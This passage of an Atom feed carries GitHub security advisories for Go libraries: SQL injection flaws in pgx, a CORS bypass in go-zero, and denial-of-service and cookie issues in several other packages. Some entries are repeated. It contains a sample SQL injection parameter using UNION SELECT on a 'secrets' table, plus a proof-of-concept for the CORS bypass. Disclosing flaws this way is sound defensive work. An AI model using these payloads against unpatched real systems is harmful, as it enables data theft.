<p>Reject user input large enough to cause a single query or bind message to exceed 4 GB in size.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jackc/pgproto3/security/advisories/GHSA-7jwh-3vrq-q3m8">https://github.com/jackc/pgproto3/security/advisories/GHSA-7jwh-3vrq-q3m8</a></li>
<li><a href="https://github.com/jackc/pgx/security/advisories/GHSA-mrww-27vc-gghv">https://github.com/jackc/pgx/security/advisories/GHSA-mrww-27vc-gghv</a></li>
<li><a href="https://github.com/jackc/pgproto3/commit/945c2126f6db8f3bea7eeebe307c01fe92bca007">https://github.com/jackc/pgproto3/commit/945c2126f6db8f3bea7eeebe307c01fe92bca007</a></li>
<li><a href="https://github.com/jackc/pgx/commit/adbb38f298c76e283ffc7c7a3f571036fea47fd4">https://github.com/jackc/pgx/commit/adbb38f298c76e283ffc7c7a3f571036fea47fd4</a></li>
<li><a href="https://github.com/jackc/pgx/commit/c543134753a0c5d22881c12404025724cb05ffd8">https://github.com/jackc/pgx/commit/c543134753a0c5d22881c12404025724cb05ffd8</a></li>
<li><a href="https://github.com/jackc/pgx/commit/f94eb0e2f96782042c96801b5ac448f44f0a81df">https://github.com/jackc/pgx/commit/f94eb0e2f96782042c96801b5ac448f44f0a81df</a></li>
<li><a href="https://github.com/advisories/GHSA-mrww-27vc-gghv">https://github.com/advisories/GHSA-mrww-27vc-gghv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mrww-27vc-gghv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-04T20:43:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/jackc/pgx] pgx SQL Injection via Protocol Message Size Overflow]]></title>
        <id>https://github.com/advisories/GHSA-mrww-27vc-gghv</id>
        <link href="https://github.com/advisories/GHSA-mrww-27vc-gghv"/>
        <updated>2024-03-04T20:43:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>SQL injection can occur if an attacker can cause a single query or bind message to exceed 4 GB in size. An integer overflow in the calculated message size can cause the one large message to be sent as multiple messages under the attacker's control.</p>
<h3 id="patches">Patches</h3>
<p>The problem is resolved in v4.18.2 and v5.5.4.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Reject user input large enough to cause a single query or bind message to exceed 4 GB in size.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jackc/pgproto3/security/advisories/GHSA-7jwh-3vrq-q3m8">https://github.com/jackc/pgproto3/security/advisories/GHSA-7jwh-3vrq-q3m8</a></li>
<li><a href="https://github.com/jackc/pgx/security/advisories/GHSA-mrww-27vc-gghv">https://github.com/jackc/pgx/security/advisories/GHSA-mrww-27vc-gghv</a></li>
<li><a href="https://github.com/jackc/pgproto3/commit/945c2126f6db8f3bea7eeebe307c01fe92bca007">https://github.com/jackc/pgproto3/commit/945c2126f6db8f3bea7eeebe307c01fe92bca007</a></li>
<li><a href="https://github.com/jackc/pgx/commit/adbb38f298c76e283ffc7c7a3f571036fea47fd4">https://github.com/jackc/pgx/commit/adbb38f298c76e283ffc7c7a3f571036fea47fd4</a></li>
<li><a href="https://github.com/jackc/pgx/commit/c543134753a0c5d22881c12404025724cb05ffd8">https://github.com/jackc/pgx/commit/c543134753a0c5d22881c12404025724cb05ffd8</a></li>
<li><a href="https://github.com/jackc/pgx/commit/f94eb0e2f96782042c96801b5ac448f44f0a81df">https://github.com/jackc/pgx/commit/f94eb0e2f96782042c96801b5ac448f44f0a81df</a></li>
<li><a href="https://github.com/advisories/GHSA-mrww-27vc-gghv">https://github.com/advisories/GHSA-mrww-27vc-gghv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mrww-27vc-gghv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-04T20:43:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/jackc/pgx] pgx SQL Injection via Protocol Message Size Overflow]]></title>
        <id>https://github.com/advisories/GHSA-mrww-27vc-gghv</id>
        <link href="https://github.com/advisories/GHSA-mrww-27vc-gghv"/>
        <updated>2024-03-04T20:43:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>SQL injection can occur if an attacker can cause a single query or bind message to exceed 4 GB in size. An integer overflow in the calculated message size can cause the one large message to be sent as multiple messages under the attacker's control.</p>
<h3 id="patches">Patches</h3>
<p>The problem is resolved in v4.18.2 and v5.5.4.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Reject user input large enough to cause a single query or bind message to exceed 4 GB in size.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jackc/pgproto3/security/advisories/GHSA-7jwh-3vrq-q3m8">https://github.com/jackc/pgproto3/security/advisories/GHSA-7jwh-3vrq-q3m8</a></li>
<li><a href="https://github.com/jackc/pgx/security/advisories/GHSA-mrww-27vc-gghv">https://github.com/jackc/pgx/security/advisories/GHSA-mrww-27vc-gghv</a></li>
<li><a href="https://github.com/jackc/pgproto3/commit/945c2126f6db8f3bea7eeebe307c01fe92bca007">https://github.com/jackc/pgproto3/commit/945c2126f6db8f3bea7eeebe307c01fe92bca007</a></li>
<li><a href="https://github.com/jackc/pgx/commit/adbb38f298c76e283ffc7c7a3f571036fea47fd4">https://github.com/jackc/pgx/commit/adbb38f298c76e283ffc7c7a3f571036fea47fd4</a></li>
<li><a href="https://github.com/jackc/pgx/commit/c543134753a0c5d22881c12404025724cb05ffd8">https://github.com/jackc/pgx/commit/c543134753a0c5d22881c12404025724cb05ffd8</a></li>
<li><a href="https://github.com/jackc/pgx/commit/f94eb0e2f96782042c96801b5ac448f44f0a81df">https://github.com/jackc/pgx/commit/f94eb0e2f96782042c96801b5ac448f44f0a81df</a></li>
<li><a href="https://github.com/advisories/GHSA-mrww-27vc-gghv">https://github.com/advisories/GHSA-mrww-27vc-gghv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mrww-27vc-gghv</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-04T20:43:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/zeromicro/go-zero] Authorization Bypass Through User-Controlled Key in go-zero]]></title>
        <id>https://github.com/advisories/GHSA-fgxv-gw55-r5fq</id>
        <link href="https://github.com/advisories/GHSA-fgxv-gw55-r5fq"/>
        <updated>2024-03-04T20:43:50.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Hello go-zero maintainer team, I would like to report a security concerning your CORS Filter feature.</p>
<h3 id="details">Details</h3>
<p>Go-zero allows user to specify a <a href="https://github.com/zeromicro/go-zero/blob/master/rest/internal/cors/handlers.go">CORS Filter</a> with a configurable allows param - which is an array of domains allowed in CORS policy.</p>
<p>However, the <code>isOriginAllowed</code> uses <code>strings.HasSuffix</code> to check the origin, which leads to bypass via domain like <code>evil-victim.com</code></p>
<pre><code class="language-go">func isOriginAllowed(allows []string, origin string) bool {
    for _, o := range allows {
        if o == allOrigins {
            return true
        }

        if strings.HasSuffix(origin, o) {
            return true
        }
    }

    return false
}
</code></pre>
<h3 id="poc">PoC</h3>
<p>Use code below as a PoC. Only requests from <code>safe.com</code> should bypass the CORS Filter</p>
<pre><code class="language-go">package main

import (
    "errors"
    "net/http"

    "github.com/zeromicro/go-zero/rest"
)

func main() {
    svr := rest.MustNewServer(rest.RestConf{Port: 8888}, rest.WithRouter(mockedRouter{}), rest.WithCors("safe.com"))
    svr.Start()
}

type mockedRouter struct{}

// some sensitive path
func (m mockedRouter) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    // check user's cookie
    // ...
    // return sensitive data
    w.Write([]byte("social_id: 420101198008292930"))
}

func (m mockedRouter) Handle(_, _ string, handler http.Handler) error {
    return errors.New("foo")
}

func (m mockedRouter) SetNotFoundHandler(_ http.Handler) {
}

func (m mockedRouter) SetNotAllowedHandler(_ http.Handler) {
}
</code></pre>
<p>Send a request to localhost:8888 with <code>Origin:not-safe.com</code>
You can see the origin reflected in response, which bypass the CORS Filter
<img alt="image" src="https://user-images.githubusercontent.com/70683161/221365842-9d76a3a4-a79d-413a-85b7-06b50b0a7807.png"></p>
<h3 id="impact">Impact</h3>
<p>This vulnerability is capable of breaking CORS policy and thus allowing any page to make requests, retrieve data on behalf of other users.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/zeromicro/go-zero/security/advisories/GHSA-fgxv-gw55-r5fq">https://github.com/zeromicro/go-zero/security/advisories/GHSA-fgxv-gw55-r5fq</a></li>
<li><a href="https://github.com/zeromicro/go-zero/commit/d9d79e930dff6218a873f4f02115df61c38b15db">https://github.com/zeromicro/go-zero/commit/d9d79e930dff6218a873f4f02115df61c38b15db</a></li>
<li><a href="https://github.com/advisories/GHSA-fgxv-gw55-r5fq">https://github.com/advisories/GHSA-fgxv-gw55-r5fq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fgxv-gw55-r5fq</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-03-04T20:42:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/jackc/pgx] pgx SQL Injection via Line Comment Creation]]></title>
        <id>https://github.com/advisories/GHSA-m7wr-2xf7-cm9p</id>
        <link href="https://github.com/advisories/GHSA-m7wr-2xf7-cm9p"/>
        <updated>2024-03-04T20:13:12.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>SQL injection can occur when all of the following conditions are met:</p>
<ol>
<li>The non-default simple protocol is used.</li>
<li>A placeholder for a numeric value must be immediately preceded by a minus.</li>
<li>There must be a second placeholder for a string value after the first placeholder; both
must be on the same line.</li>
<li>Both parameter values must be user-controlled.</li>
</ol>
<p>e.g. </p>
<p>Simple mode must be enabled:</p>
<pre><code class="language-go">// connection string includes "prefer_simple_protocol=true"
// or
// directly enabled in code
config.ConnConfig.PreferSimpleProtocol = true
</code></pre>
<p>Parameterized query:</p>
<pre><code class="language-sql">SELECT * FROM example WHERE result=-$1 OR name=$2;
</code></pre>
<p>Parameter values:</p>
<p><code>$1</code> =&gt; <code>-42</code>
<code>$2</code> =&gt; <code>"foo\n 1 AND 1=0 UNION SELECT * FROM secrets; --"</code></p>
<p>Resulting query after preparation:</p>
<pre><code class="language-sql">SELECT * FROM example WHERE result=--42 OR name= 'foo
1 AND 1=0 UNION SELECT * FROM secrets; --';
</code></pre>
<h3 id="patches">Patches</h3>
<p>The problem is resolved in v4.18.2.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Do not use the simple protocol or do not place a minus directly before a placeholder.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jackc/pgx/security/advisories/GHSA-m7wr-2xf7-cm9p">https://github.com/jackc/pgx/security/advisories/GHSA-m7wr-2xf7-cm9p</a></li>
<li><a href="https://github.com/jackc/pgx/commit/f94eb0e2f96782042c96801b5ac448f44f0a81df">https://github.com/jackc/pgx/commit/f94eb0e2f96782042c96801b5ac448f44f0a81df</a></li>
<li><a href="https://github.com/advisories/GHSA-m7wr-2xf7-cm9p">https://github.com/advisories/GHSA-m7wr-2xf7-cm9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m7wr-2xf7-cm9p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-04T20:13:11.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/swaggo/http-swagger] Denial of Service in http-swagger]]></title>
        <id>https://github.com/advisories/GHSA-xg75-q3q5-cqmv</id>
        <link href="https://github.com/advisories/GHSA-xg75-q3q5-cqmv"/>
        <updated>2024-03-04T18:35:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Allows an attacker to perform a DOS attack consisting of memory exhaustion on the host system.</p>
<h3 id="patches">Patches</h3>
<p>Yes. Please upgrade to v1.2.6.</p>
<h3 id="workarounds">Workarounds</h3>
<p>A workaround is to restrict the path prefix to the "GET" method. As shown below</p>
<pre><code>func main() {
    r := mux.NewRouter()

    r.PathPrefix("/swagger/").Handler(httpSwagger.Handler(
        httpSwagger.URL("http://localhost:1323/swagger/doc.json"), //The url pointing to API definition
        httpSwagger.DeepLinking(true),
        httpSwagger.DocExpansion("none"),
        httpSwagger.DomID("#swagger-ui"),
    )).Methods(http.MethodGet)
</code></pre>
<h3 id="references">References</h3>
<p>Reporter dongguangli from <a href="https://www.huoxian.cn/">https://www.huoxian.cn/</a> company</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in <a href="https://github.com/swaggo/http-swagger/issues">http-swagger</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/swaggo/http-swagger/security/advisories/GHSA-xg75-q3q5-cqmv">https://github.com/swaggo/http-swagger/security/advisories/GHSA-xg75-q3q5-cqmv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24863">https://nvd.nist.gov/vuln/detail/CVE-2022-24863</a></li>
<li><a href="https://github.com/swaggo/http-swagger/pull/62">https://github.com/swaggo/http-swagger/pull/62</a></li>
<li><a href="https://github.com/swaggo/http-swagger/commit/b7d83e8fba85a7a51aa7e45e8244b4173f15049e">https://github.com/swaggo/http-swagger/commit/b7d83e8fba85a7a51aa7e45e8244b4173f15049e</a></li>
<li><a href="https://github.com/swaggo/http-swagger/releases/tag/v1.2.6">https://github.com/swaggo/http-swagger/releases/tag/v1.2.6</a></li>
<li><a href="https://cosmosofcyberspace.github.io/improper_http_method_leads_to_xss/poc.html">https://cosmosofcyberspace.github.io/improper_http_method_leads_to_xss/poc.html</a></li>
<li><a href="https://github.com/advisories/GHSA-xg75-q3q5-cqmv">https://github.com/advisories/GHSA-xg75-q3q5-cqmv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xg75-q3q5-cqmv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-04-22T20:55:52.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/authzed/spicedb] Integer overflow in chunking helper causes dispatching to miss elements or panic]]></title>
        <id>https://github.com/advisories/GHSA-h3m7-rqc4-7h9p</id>
        <link href="https://github.com/advisories/GHSA-h3m7-rqc4-7h9p"/>
        <updated>2024-03-01T23:32:10.000Z</updated>
        <content type="html"><![CDATA[<p>Any SpiceDB cluster with any schema where a resource being checked has more than 65535 relationships for the same resource and subject type is affected by this problem.</p>
<p>The issue may also lead to a panic rendering the server unavailable</p>
<p>The following API methods are affected:</p>
<ul>
<li><a href="https://buf.build/authzed/api/docs/main:authzed.api.v1#authzed.api.v1.PermissionsService.CheckPermission">CheckPermission</a></li>
<li><a href="https://buf.build/authzed/api/docs/main:authzed.api.v1#authzed.api.v1.ExperimentalService.BulkCheckPermission">BulkCheckPermission</a></li>
<li><a href="https://buf.build/authzed/api/docs/main:authzed.api.v1#authzed.api.v1.PermissionsService.LookupSubjects">LookupSubjects</a></li>
</ul>
<h4 id="impact">Impact</h4>
<p>Permission checks that are expected to be allowed are instead denied, and lookup subjects will return fewer subjects than expected.</p>
<h4 id="workarounds">Workarounds</h4>
<p>There is no workaround other than making sure that the SpiceDB cluster does not have very wide relations, with the maximum value being the maximum value of an 16-bit unsigned integer</p>
<h4 id="remediations">Remediations</h4>
<ul>
<li>AuthZed Dedicated customers: No action. AuthZed has upgraded all deployments.</li>
<li>AuthZed Serverless customers: No Action. AuthZed has upgraded all deployments.</li>
<li>AuthZed Enterprise customers: Upgrade to <a href="https://github.com/authzed-enterprise/src/pkgs/container/spicedb-enterprise/182719614?tag=v1.29.2-hotfix-enterprise.v1.hotfix.v1">v1.29.2-hotfix-enterprise.v1.hotfix.v1</a></li>
<li>Open Source users: Upgrade to v1.29.2</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authzed/spicedb/security/advisories/GHSA-h3m7-rqc4-7h9p">https://github.com/authzed/spicedb/security/advisories/GHSA-h3m7-rqc4-7h9p</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-27101">https://nvd.nist.gov/vuln/detail/CVE-2024-27101</a></li>
<li><a href="https://github.com/authzed/spicedb/commit/ef443c442b96909694390324a99849b0407007fe">https://github.com/authzed/spicedb/commit/ef443c442b96909694390324a99849b0407007fe</a></li>
<li><a href="https://github.com/advisories/GHSA-h3m7-rqc4-7h9p">https://github.com/advisories/GHSA-h3m7-rqc4-7h9p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h3m7-rqc4-7h9p</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-01T23:32:10.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/dvsekhvalnov/jose2go] jose2go vulnerable to denial of service via large p2c value]]></title>
        <id>https://github.com/advisories/GHSA-6294-6rgp-fr7r</id>
        <link href="https://github.com/advisories/GHSA-6294-6rgp-fr7r"/>
        <updated>2024-03-01T16:56:03.000Z</updated>
        <content type="html"><![CDATA[<p>The jose2go component before 1.6.0 for Go allows attackers to cause a denial of service (CPU consumption) via a large p2c (aka PBES2 Count) value.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-50658">https://nvd.nist.gov/vuln/detail/CVE-2023-50658</a></li>
<li><a href="https://github.com/dvsekhvalnov/jose2go/commit/a4584e9dd7128608fedbc67892eba9697f0d5317">https://github.com/dvsekhvalnov/jose2go/commit/a4584e9dd7128608fedbc67892eba9697f0d5317</a></li>
<li><a href="https://github.com/dvsekhvalnov/jose2go/compare/v1.5.0...v1.6.0">https://github.com/dvsekhvalnov/jose2go/compare/v1.5.0...v1.6.0</a></li>
<li><a href="https://github.com/advisories/GHSA-6294-6rgp-fr7r">https://github.com/advisories/GHSA-6294-6rgp-fr7r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6294-6rgp-fr7r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-02-29T03:33:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/notaryproject/notation] Notation vulnerable to denial of service from high number of artifact signatures]]></title>
        <id>https://github.com/advisories/GHSA-9m3v-v4r5-ppx7</id>
        <link href="https://github.com/advisories/GHSA-9m3v-v4r5-ppx7"/>
        <updated>2024-03-01T15:18:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>An attacker who controls or compromises a registry can make the registry serve an infinite number of signatures for the artifact, causing a denial of service to the host machine running <code>notation verify</code>.</p>
<h3 id="patches">Patches</h3>
<p>The problem has been fixed in the release <a href="https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6">v1.0.0-rc.6</a>. Users should upgrade their notation packages to <a href="https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6">v1.0.0-rc.6</a> or above.</p>
<h3 id="workarounds">Workarounds</h3>
<p>User should use secure and trusted container registries.</p>
<h3 id="credits">Credits</h3>
<p>The <code>notation</code> project would like to thank Adam Korczynski (@AdamKorcz) for responsibly disclosing the issue found during an security audit (facilitated by OSTIF and sponsored by CNCF) and Shiwei Zhang (@shizhMSFT) for root cause analysis.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/notaryproject/notation/security/advisories/GHSA-9m3v-v4r5-ppx7">https://github.com/notaryproject/notation/security/advisories/GHSA-9m3v-v4r5-ppx7</a></li>
<li><a href="https://github.com/notaryproject/notation/commit/ed22fde52f6d70ae0b53521bd28c9ccafa868c24">https://github.com/notaryproject/notation/commit/ed22fde52f6d70ae0b53521bd28c9ccafa868c24</a></li>
<li><a href="https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6">https://github.com/notaryproject/notation/releases/tag/v1.0.0-rc.6</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-33957">https://nvd.nist.gov/vuln/detail/CVE-2023-33957</a></li>
<li><a href="https://github.com/advisories/GHSA-9m3v-v4r5-ppx7">https://github.com/advisories/GHSA-9m3v-v4r5-ppx7</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9m3v-v4r5-ppx7</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2023-06-06T16:43:01.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/go-macaron/csrf] Macaron csrf missing encryption and has sensitive cookies in HTTP session without secure attribute]]></title>
        <id>https://github.com/advisories/GHSA-hhxg-px5h-jc32</id>
        <link href="https://github.com/advisories/GHSA-hhxg-px5h-jc32"/>
        <updated>2024-03-01T14:24:39.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in Macaron csrf and classified as problematic. Affected by this issue is some unknown functionality of the file <code>csrf.go</code>. The manipulation of the argument Generate leads to sensitive cookie without secure attribute. The attack may be launched remotely. The name of the patch is dadd1711a617000b70e5e408a76531b73187031c. It is recommended to apply a patch to fix this issue. VDB-217058 is the identifier assigned to this vulnerability.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2018-25060">https://nvd.nist.gov/vuln/detail/CVE-2018-25060</a></li>
<li><a href="https://github.com/go-macaron/csrf/pull/7">https://github.com/go-macaron/csrf/pull/7</a></li>
<li><a href="https://github.com/go-macaron/csrf/commit/dadd1711a617000b70e5e408a76531b73187031c">https://github.com/go-macaron/csrf/commit/dadd1711a617000b70e5e408a76531b73187031c</a></li>
<li><a href="https://vuldb.com/?ctiid.217058">https://vuldb.com/?ctiid.217058</a></li>
<li><a href="https://vuldb.com/?id.217058">https://vuldb.com/?id.217058</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1213">https://pkg.go.dev/vuln/GO-2022-1213</a></li>
<li><a href="https://github.com/advisories/GHSA-hhxg-px5h-jc32">https://github.com/advisories/GHSA-hhxg-px5h-jc32</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hhxg-px5h-jc32</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-30T12:30:25.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[code.sajari.com/docconv] docconv vulnerable to Memory Allocation with Excessive Size Value]]></title>
        <id>https://github.com/advisories/GHSA-qvx2-59g8-8hph</id>
        <link href="https://github.com/advisories/GHSA-qvx2-59g8-8hph"/>
        <updated>2024-03-01T14:21:09.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in docconv up to 1.2.0 and classified as problematic. This issue affects the function <code>ConvertDocx/ConvertODT/ConvertPages/ConvertXML/XMLToText</code>. The manipulation leads to uncontrolled memory allocation. The attack may be initiated remotely. Upgrading to version 1.2.1 can address this issue. The name of the patch is 42bcff666855ab978e67a9041d0cdea552f20301. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-216779.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4741">https://nvd.nist.gov/vuln/detail/CVE-2022-4741</a></li>
<li><a href="https://github.com/sajari/docconv/pull/111">https://github.com/sajari/docconv/pull/111</a></li>
<li><a href="https://github.com/sajari/docconv/commit/42bcff666855ab978e67a9041d0cdea552f20301">https://github.com/sajari/docconv/commit/42bcff666855ab978e67a9041d0cdea552f20301</a></li>
<li><a href="https://github.com/sajari/docconv/releases/tag/v1.2.1">https://github.com/sajari/docconv/releases/tag/v1.2.1</a></li>
<li><a href="https://vuldb.com/?ctiid.216779">https://vuldb.com/?ctiid.216779</a></li>
<li><a href="https://vuldb.com/?id.216779">https://vuldb.com/?id.216779</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1188">https://pkg.go.dev/vuln/GO-2022-1188</a></li>
<li><a href="https://github.com/advisories/GHSA-qvx2-59g8-8hph">https://github.com/advisories/GHSA-qvx2-59g8-8hph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qvx2-59g8-8hph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-25T21:30:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/sajari/docconv] docconv vulnerable to Memory Allocation with Excessive Size Value]]></title>
        <id>https://github.com/advisories/GHSA-qvx2-59g8-8hph</id>
        <link href="https://github.com/advisories/GHSA-qvx2-59g8-8hph"/>
        <updated>2024-03-01T14:21:09.000Z</updated>
        <content type="html"><![CDATA[<p>A vulnerability was found in docconv up to 1.2.0 and classified as problematic. This issue affects the function <code>ConvertDocx/ConvertODT/ConvertPages/ConvertXML/XMLToText</code>. The manipulation leads to uncontrolled memory allocation. The attack may be initiated remotely. Upgrading to version 1.2.1 can address this issue. The name of the patch is 42bcff666855ab978e67a9041d0cdea552f20301. It is recommended to upgrade the affected component. The associated identifier of this vulnerability is VDB-216779.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-4741">https://nvd.nist.gov/vuln/detail/CVE-2022-4741</a></li>
<li><a href="https://github.com/sajari/docconv/pull/111">https://github.com/sajari/docconv/pull/111</a></li>
<li><a href="https://github.com/sajari/docconv/commit/42bcff666855ab978e67a9041d0cdea552f20301">https://github.com/sajari/docconv/commit/42bcff666855ab978e67a9041d0cdea552f20301</a></li>
<li><a href="https://github.com/sajari/docconv/releases/tag/v1.2.1">https://github.com/sajari/docconv/releases/tag/v1.2.1</a></li>
<li><a href="https://vuldb.com/?ctiid.216779">https://vuldb.com/?ctiid.216779</a></li>
<li><a href="https://vuldb.com/?id.216779">https://vuldb.com/?id.216779</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1188">https://pkg.go.dev/vuln/GO-2022-1188</a></li>
<li><a href="https://github.com/advisories/GHSA-qvx2-59g8-8hph">https://github.com/advisories/GHSA-qvx2-59g8-8hph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qvx2-59g8-8hph</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-12-25T21:30:21.000Z</published>
    </entry>
</feed>